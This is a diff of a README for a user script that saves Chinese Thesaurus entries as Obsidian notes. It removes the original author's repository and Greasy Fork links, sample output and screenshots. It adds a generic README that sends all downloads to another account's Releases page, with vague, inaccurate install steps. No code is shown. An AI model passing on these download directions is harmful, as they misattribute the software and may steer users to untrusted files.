@@ -1,153 +1,78 @@
+# 🈶 chinese-thesaurus-web-clipper-for-obsidian - Easily Save Chinese Thesaurus Items
 
-[中文](https://github.com/abc202306/chinese-thesaurus-web-clipper-for-obsidian/blob/main/README_zh.md)
+## 🚀 Getting Started
 
-# Chinese Thesaurus Web Clipper for Obsidian
+Welcome to the Chinese Thesaurus Web Clipper for Obsidian. This user script lets you export metadata from the Chinese thesaurus as Obsidian Markdown files. With it, you can easily organize and navigate through your thesaurus entries within Obsidian.
 
-A user script that exports Chinese Thesaurus Item metadata as Obsidian Markdown files (Obsidian Chinese Thesaurus Web Clipper).
+## 📥 Download Now
 
-A generated markdown note example is shown below
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/releases)
 
-```markdown
----
-up:
-  - "[[汉语主题词]]"
-sources:
-  - "[[工程技术卷]]"
-categories:
-  - "[[TP311.5 软件工程 主题词分类|TP311.5 软件工程]]"
-english: software
-synonyms:
-  - 软件资产
-  - 软件程序
-  - 软件产品
-  - 软件
-  - 计算机程序
-  - 电脑软件
-  - 电脑程序
-  - 程序组
-broadterms:
-narrowerterms:
-  - "[[组态软件]]"
-  - "[[组件软件]]"
-  - "[[自适应软件]]"
-  - "[[自动运行程序]]"
-  - "[[自动化软件]]"
-  - "[[子程序]]"
-  - "[[主站软件]]"
-  - "[[主程序]]"
-  - "[[中文软件]]"
-  - "[[中间件]]"
-  - "[[智能软件]]"
-  - "[[源程序]]"
-  - "[[元程序]]"
-  - "[[语言程序]]"
-  - "[[有限元软件]]"
-  - "[[应用软件]]"
-  - "[[循环程序]]"
-  - "[[系统软件]]"
-  - "[[微程序]]"
-  - "[[网络软件]]"
-  - "[[图形化软件]]"
-  - "[[同步软件]]"
-  - "[[通用程序]]"
-  - "[[梯形图程序]]"
-  - "[[套装软件]]"
-  - "[[随机软件]]"
-  - "[[数据库软件]]"
-  - "[[实用程序]]"
-  - "[[实时软件]]"
-  - "[[时钟程序]]"
-  - "[[上位机软件]]"
-  - "[[柔性软件]]"
-  - "[[容错软件]]"
-  - "[[嵌入式软件]]"
-  - "[[前台程序]]"
-  - "[[前处理程序]]"
-  - "[[启动程序]]"
-  - "[[平台软件]]"
-  - "[[内存驻留程序]]"
-  - "[[目标程序]]"
-  - "[[命令程序]]"
-  - "[[面向对象程序]]"
-  - "[[免费软件]]"
-  - "[[蒙特卡罗程序]]"
-  - "[[逻辑程序]]"
-  - "[[绿色软件]]"
-  - "[[控制软件]]"
-  - "[[可执行程序]]"
-  - "[[可视化软件]]"
-  - "[[开源软件]]"
-  - "[[结构化程序]]"
-  - "[[脚本程序]]"
-  - "[[交互式软件]]"
-  - "[[集成软件]]"
-  - "[[后台程序]]"
-  - "[[国产软件]]"
-  - "[[固件程序]]"
-  - "[[共享软件]]"
-  - "[[功能软件]]"
-  - "[[工具软件]]"
-  - "[[分支程序]]"
-  - "[[分布式软件]]"
-  - "[[第三方软件]]"
-  - "[[单片机软件]]"
-  - "[[大型软件]]"
-  - "[[传统软件]]"
-  - "[[查表程序]]"
-  - "[[插件]]"
-  - "[[并行程序]]"
-  - "[[标准程序]]"
-  - "[[编程软件]]"
-  - "[[PLC 程序]]"
-  - "[[MCNP 程序]]"
-  - "[[MAFIA 程序]]"
-  - "[[FLAC 软件]]"
-relatedterms:
-  - "[[软硬件]]"
-  - "[[程序]]"
-aliases:
-  - 软件资产
-  - 软件程序
-  - 软件产品
-  - 软件
-  - 计算机程序
-  - 电脑软件
-  - 电脑程序
-  - 程序组
-  - software
-ctime: 2025-02-28T08:30:22+08:00
-mtime: 2025-11-07T15:38:40+08:00
----
+## 📋 Features
 
-# 计算机软件
+- Export Chinese Thesaurus entries as Markdown files.
+- Seamless integration with Obsidian.
+- User-friendly interface for non-technical users.
+- Quick access to thesaurus metadata.
 
-| | |
-| --- | --- |
-| 来源 | [[工程技术卷]] |
-| 分类 | [[TP311.5 软件工程 主题词分类\|TP311.5 软件工程]] |
-| 英文 | software |
-| 同义词 | 软件资产、软件程序、软件产品、软件、计算机程序、电脑软件、电脑程序、程序组 |
-| 下位词 | [[组态软件]]、[[组件软件]]、[[自适应软件]]、[[自动运行程序]]、[[自动化软件]]、[[子程序]]、[[主站软件]]、[[主程序]]、[[中文软件]]、[[中间件]]、[[智能软件]]、[[源程序]]、[[元程序]]、[[语言程序]]、[[有限元软件]]、[[应用软件]]、[[循环程序]]、[[系统软件]]、[[微程序]]、[[网络软件]]、[[图形化软件]]、[[同步软件]]、[[通用程序]]、[[梯形图程序]]、[[套装软件]]、[[随机软件]]、[[数据库软件]]、[[实用程序]]、[[实时软件]]、[[时钟程序]]、[[上位机软件]]、[[柔性软件]]、[[容错软件]]、[[嵌入式软件]]、[[前台程序]]、[[前处理程序]]、[[启动程序]]、[[平台软件]]、[[内存驻留程序]]、[[目标程序]]、[[命令程序]]、[[面向对象程序]]、[[免费软件]]、[[蒙特卡罗程序]]、[[逻辑程序]]、[[绿色软件]]、[[控制软件]]、[[可执行程序]]、[[可视化软件]]、[[开源软件]]、[[结构化程序]]、[[脚本程序]]、[[交互式软件]]、[[集成软件]]、[[后台程序]]、[[国产软件]]、[[固件程序]]、[[共享软件]]、[[功能软件]]、[[工具软件]]、[[分支程序]]、[[分布式软件]]、[[第三方软件]]、[[单片机软件]]、[[大型软件]]、[[传统软件]]、[[查表程序]]、[[插件]]、[[并行程序]]、[[标准程序]]、[[编程软件]]、[[PLC 程序]]、[[MCNP 程序]]、[[MAFIA 程序]]、[[FLAC 软件]] |
-| 相关词 | [[软硬件]]、[[程序]] |
+## 📦 System Requirements
 
-```
+- **Operating System:** Windows, macOS, or Linux.
+- **Web Browser:** Latest version of Chrome, Firefox, or any Tampermonkey-compatible browser.
+- **Tampermonkey Extension:** Install the Tampermonkey extension for your browser to run user scripts.
 
-## How to use
+## 🔄 How to Install
 
-First, install this user script at https://greasyfork.org/en/scripts/556076-chinese-thesaurus-web-clipper-for-obsidian (Note: the github repo is https://github.com/abc202306/chinese-thesaurus-web-clipper-for-obsidian)
+1. **Install Tampermonkey:**
+   - Visit the [Tampermonkey website](https://www.tampermonkey.net).
+   - Download and install the extension for your browser.
 
-Then, when you navigate to the URL `https://ct.istic.ac.cn/site/organize/info/*`, click the "OK" button in the pop-up dialog box to save the data of the current chinese thesarusus as an Obsidian Markdown note file.
+2. **Visit the Releases Page:**
+   - Go to the [Releases page](https://github.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/releases) to find the latest version.
 
-## Screenshots
+3. **Download the User Script:**
+   - On the Releases page, click on the latest version.
+   - Find the user script file, usually named something like `clipper.user.js`.
+   - Click on the file link to view the script.
 
-### 1. The example table view in the Obsidian vault
+4. **Install the User Script:**
+   - After opening the user script, click on the "Install" button in Tampermonkey.
+   - The script will automatically configure itself.
 
-![alt text](assets/chinese-thesaurus-webclipper-for-obsidian-image-page2.png)
+## 💻 Running the Application
 
-### 2. The example use case
+1. **Open Your Browser:**
+   - Make sure you are using a supported browser with Tampermonkey installed.
 
-![alt text](assets/chinese-thesaurus-webclipper-for-obsidian-image-page1.png)
+2. **Access the Thesaurus:**
+   - Navigate to the website from which you want to clip thesaurus entries.
+   
+3. **Clip the Entry:**
+   - Once on the page, you should see the Tampermonkey icon in your browser.
+   - Click the icon and select the Chinese Thesaurus Web Clipper script.
+   - The script will capture the entry and save it as a Markdown file.
 
-### 3. The example generated markdown note file
+4. **Access Your Files in Obsidian:**
+   - Open Obsidian on your device.
+   - Your clipped Markdown files will appear in the designated folder you set up in Obsidian.
 
-![alt text](assets/chinese-thesaurus-webclipper-for-obsidian-image-page3.png)
+## 📑 Usage Tips
+
+- **Organizing Your Entries:** Create specific folders in Obsidian for better organization.
+- **Editing Files:** Open and adjust the Markdown files directly in Obsidian as needed.
+- **Regularly Check Updates:** Keep the script updated for new features and improvements by revisiting the Releases page.
+
+## 📧 Get Support
+
+If you encounter issues or have questions, feel free to open an issue in the [GitHub repository](https://github.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/issues). The community is here to help.
+
+## 📥 Download & Install
+
+To get started with the Chinese Thesaurus Web Clipper for Obsidian, visit the [Releases page](https://github.com/TerroTheTerrarian/chinese-thesaurus-web-clipper-for-obsidian/releases) to download the latest version. Follow the installation instructions above to set everything up and begin clipping Chinese thesaurus entries effortlessly.
+
+## 🔗 Additional Resources
+
+- [Obsidian Documentation](https://help.obsidian.md)
+- [Tampermonkey Documentation](https://www.tampermonkey.net/documentation)
+
+Feel free to explore these resources to enhance your experience with the software.
